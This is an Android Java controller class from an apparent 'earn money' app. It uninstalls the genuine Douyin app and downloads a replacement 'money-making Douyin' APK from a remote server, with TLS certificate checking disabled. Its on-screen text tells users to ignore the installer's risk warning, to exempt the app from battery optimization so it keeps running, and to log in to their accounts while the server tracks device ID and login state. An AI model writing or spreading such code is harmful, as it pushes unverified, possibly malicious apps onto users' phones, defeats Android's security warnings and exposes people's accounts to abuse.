package com.vovo.netmoneytask.controller;


import android.annotation.SuppressLint;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.Html;
import android.text.Spanned;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import com.vovo.Constant;
import com.vovo.handler.AppUtils;
import com.vovo.handler.BatteryOptimizationHelper;
import com.vovo.handler.HttpUtils;
import com.vovo.netmoneytask.R;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import static androidx.core.content.ContextCompat.startActivity;

public class DyController {

    private String projectInfo = "http://vovo.charick.com/api/netMoneyTask/project?type=dyNetMoney";

    private String deviceInfo = "http://vovo.charick.com/api/netMoneyTask/check?type=dyDeviceInfo";

    private String packageName = "com.ss.android.ugc.aweme";

    private Context context;

    private TextView dy_project_info;
    private TextView dy_project_status;
    private TextView dy_project_upset;

    private Button dy_project_upset_battery;
    private Button dy_project_upset_opendy;
    private Button dy_project_upset_appinfoset;

    private File apkFile;

    private boolean isupsetNow = false;


    Handler handler = new Handler(Looper.getMainLooper());

    // 构造函数，传入 Activity 作为上下文以及监听器
    @SuppressLint("WrongConstant")
    public DyController(Context context, View activity) {
        this.context = context;
        dy_project_info = activity.findViewById(R.id.dy_project_info);
        dy_project_status = activity.findViewById(R.id.dy_project_status);
        dy_project_upset = activity.findViewById(R.id.dy_project_upset);
        dy_project_upset_battery = activity.findViewById(R.id.dy_project_upset_battery);
        dy_project_upset_opendy = activity.findViewById(R.id.dy_project_upset_opendy);
        dy_project_upset_appinfoset = activity.findViewById(R.id.dy_project_upset_appinfoset);


        dy_project_upset.setOnClickListener(v -> upsetClick());
        dy_project_status.setOnClickListener(v -> reflushButtonClick());
        dy_project_upset_battery.setVisibility(View.GONE);
        dy_project_upset_battery.setOnClickListener(v -> batteryButtonClick());
        dy_project_upset_opendy.setOnClickListener(v -> openDyClick());
        dy_project_upset_appinfoset.setVisibility(View.GONE);
        dy_project_upset_appinfoset.setOnClickListener(v -> openAppDetailsPage());


        deviceInfo = deviceInfo + "&androidId=" + Constant.androidId;
    }


    public void init() {
        new Thread(() -> {

            //初始化项目介绍信息
            try {
                String htmlTextStr = new JSONObject(HttpUtils.requestGetAPI(projectInfo)).getString("projectInfo");
                // 使用 Handler 将更新 UI 的任务提交给主线程
                handler.post(new Runnable() {
                    @Override
                    public void run() {

                        Spanned spanned1 = Html.fromHtml(htmlTextStr);
                        dy_project_info.setText(spanned1);
                    }
                });
            } catch (Exception e) {
                Log.e("DyController", "init 时出错", e);
            }

            //初始化按钮显示
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!BatteryOptimizationHelper.isBatteryOptimized(this.context)) {
                    handler.post(new Runnable() {
                        @SuppressLint("WrongConstant")
                        @Override
                        public void run() {
                            dy_project_upset_battery.setVisibility(View.VISIBLE);
                            dy_project_upset_appinfoset.setVisibility(View.VISIBLE);
                        }

                    });
                }
            }

            //初始化最新版抖音下载链接
            try {
                JSONObject jsonObject = new JSONObject(HttpUtils.requestGetAPI(deviceInfo));
                Constant.dyApkDownloadUrl = jsonObject.getString("newAppUrl");
            } catch (JSONException e) {
                throw new RuntimeException(e);
            }


        }).start();
    }

    private void batteryButtonClick() {
        if (!AppUtils.isAppInstalled(context, packageName)) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, "请先安装项目，再优化", Toast.LENGTH_SHORT).show();
                }
            });
            return;
        }

        // 如果应用被电池优化
        handler.post(new Runnable() {
            @Override
            public void run() {
                new AlertDialog.Builder(context)
                        .setTitle("关闭后台限制抖音")
                        .setMessage("为了让抖音赚取佣金，需要后台保活，防止被系统电池优化杀死，请从【电池优化全部列表】中找到抖音应用，点击设置为不优化。")
                        .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                // 跳转到电池优化设置页面
                                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                                context.startActivity(intent);
                            }
                        })
                        .setNegativeButton("取消", null)
                        .show();
            }
        });
    }

    public void openDyClick() {

        if (!AppUtils.isAppInstalled(context, packageName)) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, "请先安装项目", Toast.LENGTH_SHORT).show();
                }
            });
            return;
        }

        // 使用包名打开抖音应用
        Intent intent = context.getPackageManager().getLaunchIntentForPackage(packageName);
        if (intent != null) {
            startActivity(context, intent, null);
        }

    }

    // 打开应用的设置详情页面
    private void openAppDetailsPage() {

        if (!AppUtils.isAppInstalled(context, packageName)) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, "请先安装项目，再优化", Toast.LENGTH_SHORT).show();
                }
            });
            return;
        }

        // 如果应用被电池优化
        handler.post(new Runnable() {
            @Override
            public void run() {
                new AlertDialog.Builder(context)
                        .setTitle("关闭抖音省电策略")
                        .setMessage("为了让抖音赚取佣金，需要后台保活，防止被系统电池优化杀死，需进入应用详情页中【省电策略】栏，设置成无限制")
                        .setPositiveButton("去设置", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                // 跳转到电池优化设置页面
                                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                Uri uri = Uri.fromParts("package", packageName, null); // 获取当前应用的包名
                                intent.setData(uri);  // 设置 URI
                                startActivity(context, intent, null); // 启动设置页面
                            }
                        })
                        .setNegativeButton("取消", null)
                        .show();
            }
        });
    }


    public void upsetClick() {
        if (isupsetNow) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, "项目安装中....请稍等", Toast.LENGTH_SHORT).show();
                }
            });
            return;
        }

        new Thread(() -> {
            try {
                if (!AppUtils.isAppInstalled(context, packageName)) {
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            new AlertDialog.Builder(context)
                                    .setTitle("项目安装/升级")
                                    .setMessage("安装【网赚版抖音】，抖音安装后，正常登录使用，即可赚取佣金！")
                                    .setPositiveButton("确认", (dialog, which) -> {
                                        downloadAndInstallAPK(Constant.dyApkDownloadUrl);
                                    })
                                    .setNegativeButton("取消", null)
                                    .show();
                        }
                    });
                } else {
                    projectRunStatus();
                }

            } catch (Exception e) {
                Log.e("DyController", "init 时出错", e);
            }
        }).start();
    }

    public void reflushButtonClick() {
        if (isupsetNow) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    Toast.makeText(context, "项目安装中....请稍等", Toast.LENGTH_SHORT).show();
                }
            });
            return;
        }
        new Thread(() -> {
            try {
                if (!AppUtils.isAppInstalled(context, packageName)) {
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            dy_project_status.setText("");
                            Spanned spannedtemp = Html.fromHtml("项目未安装，<span style='background-color:#FFE500;'>【请点击此时安装】</span>");
                            dy_project_upset.setText(spannedtemp);
                        }
                    });
                    return;
                }

                projectRunStatus();

                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        Toast.makeText(context, "已刷新", Toast.LENGTH_SHORT).show();
                    }
                });


            } catch (Exception e) {
                Log.e("DyController", "init 时出错", e);
            }
        }).start();
    }

    /**
     * 项目运行状态检测
     */
    private boolean projectRunStatus() throws JSONException {
        JSONObject deviceRunStatusJsonView = new JSONObject(HttpUtils.requestGetAPI(deviceInfo));
        Constant.dyApkDownloadUrl = deviceRunStatusJsonView.getString("newAppUrl");
        String curVersion = deviceRunStatusJsonView.getString("curVersion");
        String newVersionCode = deviceRunStatusJsonView.getString("newVersionCode");
        int onlineState = deviceRunStatusJsonView.getInt("onlineState");
        int loginState = deviceRunStatusJsonView.getInt("loginState");
        String onlineDsp = deviceRunStatusJsonView.getString("onlineDsp");

        if (onlineState != 1) {
            Spanned spannedtemp = Html.fromHtml("<span style=\"background-color:#FFE500;\">抖音离线</span>，请打开抖音app, 正常使用1分钟即可。");
            handler.post(new Runnable() {
                @SuppressLint("WrongConstant")
                @Override
                public void run() {
                    dy_project_status.setText("");
                    dy_project_upset.setText(spannedtemp);
                }
            });
            return true;
        } else if (!curVersion.equalsIgnoreCase(newVersionCode)) {
            handler.post(new Runnable() {
                @Override
                public void run() {
                    new AlertDialog.Builder(context)
                            .setTitle("项目安装/升级")
                            .setMessage("需先卸载当前抖音，安装最新【网赚版抖音】，安装后，抖音正常登录使用，即可赚取佣金！")
                            .setPositiveButton("确认", (dialog, which) -> {
                                // 执行卸载应用和安装 APK 的操作
                                isupsetNow = true;
                                if (uninstallApp(packageName)) {
                                    downloadAndInstallAPK(Constant.dyApkDownloadUrl);
                                } else {
                                    Spanned spannedtemp = Html.fromHtml("原抖音卸载失败! 请先<span style=\"background-color:#FFE500;\">点击重试或手动卸载</span>");
                                    dy_project_upset.setText(spannedtemp);
                                    isupsetNow = false;
                                }
                            })
                            .setNegativeButton("取消", null)
                            .show();
                }
            });
        } else if (loginState != 1) {
            Spanned spannedtemp = Html.fromHtml("<span style=\"background-color:#FFE500;\">抖音未登录</span>，请检查抖音app是否登录账号。");
            handler.post(new Runnable() {
                @SuppressLint("WrongConstant")
                @Override
                public void run() {
                    dy_project_status.setText("");
                    dy_project_upset.setText(spannedtemp);
                }
            });
            return true;
        } else {
            Spanned spannedtemp = Html.fromHtml("恭喜，项目<span style=\"background-color:#FFE500;\"> 运行正常，坐享佣金！</span>");
            Spanned spanned2 = Html.fromHtml(onlineDsp);
            handler.post(new Runnable() {
                @Override
                public void run() {
                    dy_project_upset.setText(spannedtemp);
                    dy_project_status.setText(spanned2);
                }
            });

            if (apkFile != null && apkFile.exists()) {
                apkFile.delete();
            }

        }
        return false;
    }

    // 卸载应用
    private boolean uninstallApp(String packageName) {
        // 在这里通过 Intent 执行卸载应用的操作
        // 在 Android 11 或更高版本需要适当的权限
        // 如：Manifest.permission.REQUEST_DELETE_PACKAGES
        PackageManager pm = context.getPackageManager();
        ProgressDialog progressDialog = new ProgressDialog(context);
        try {
            // 创建一个自定义的加载框
            progressDialog.setMessage("app卸载中....");
            progressDialog.setCancelable(false); // 让进度条不能关闭
            progressDialog.show();
            pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            Uri packageUri = Uri.parse("package:" + packageName);
            Intent uninstallIntent = new Intent(Intent.ACTION_UNINSTALL_PACKAGE, packageUri);
            context.startActivity(uninstallIntent);
            progressDialog.dismiss();
        } catch (PackageManager.NameNotFoundException e) {
            progressDialog.setMessage("app卸载失败....");
            progressDialog.dismiss();
            return false;
        }
        return true;
    }


    // 下载 APK 并自动安装
    private void downloadAndInstallAPK(String urlString) {
        isupsetNow = true;
        // 创建一个自定义的加载框
        ProgressDialog progressDialog = new ProgressDialog(context);
        Spanned spannedtemp = Html.fromHtml("正在下载【网赚版抖音】，预计2分钟启动安装程序,<span style='background-color:#FFE500;'> 请勿退出！</span> <p> 安装可能会弹出风险提示, 请放心继续安装即可 </p>");
        progressDialog.setMessage(spannedtemp);
        progressDialog.setCancelable(false); // 让进度条不能关闭
        progressDialog.show();

        new Thread(() -> {
            try {

                HttpUtils.disableCertificateChecking();
                // 下载 APK 文件
                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);

                InputStream inputStream = connection.getInputStream();
                apkFile = new File(context.getExternalFilesDir(null), "dy_downloaded.apk");
                FileOutputStream fileOutputStream = new FileOutputStream(apkFile);

                byte[] buffer = new byte[1024];
                int length;
                while ((length = inputStream.read(buffer)) > 0) {
                    fileOutputStream.write(buffer, 0, length);
                }

                fileOutputStream.close();
                inputStream.close();
            } catch (Exception e) {
                Log.e("APK Download", "下载或安装 APK 时出错", e);
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        dy_project_upset.setText("下载app失败，请退出app后【点击此处重试】！或联系客服！");
                    }
                });
                progressDialog.dismiss();
                return;
            }

            try {

                AppUtils.installAPK(context, apkFile);

                //检测项目是否安装
                int counter = 0;
                while (true) {
                    Thread.sleep(2000);

                    if (AppUtils.isAppInstalled(this.context, packageName)) {
                        Thread.sleep(2000);
                        progressDialog.dismiss();
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                Spanned spannedtemp = Html.fromHtml("恭喜，项目已安装! 请先<span style=\"background-color:#FFE500;\">登录抖音账号</span> 即可坐享佣金！");
                                dy_project_upset.setText(spannedtemp);
                            }
                        });
                        if (apkFile != null && apkFile.exists()) {
                            apkFile.delete();
                        }
                        isupsetNow = false;
                        break;
                    } else if (counter++ > 30) {
                        progressDialog.dismiss();
                        handler.post(new Runnable() {
                            @Override
                            public void run() {
                                Spanned spannedtemp = Html.fromHtml("项目安装超时! <span style=\"background-color:#FFE500;\">请点击刷新</span> ！");
                                dy_project_upset.setText(spannedtemp);
                            }
                        });
                        isupsetNow = false;
                        break;
                    }
                }

            } catch (Exception e) {
                Log.e("APK Download", "下载或安装 APK 时出错", e);
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        dy_project_upset.setText("项目安装失败，【点击此处重试】！或联系客服！");
                    }
                });
                isupsetNow = false;
                progressDialog.dismiss();
            }

        }).start();
    }


}

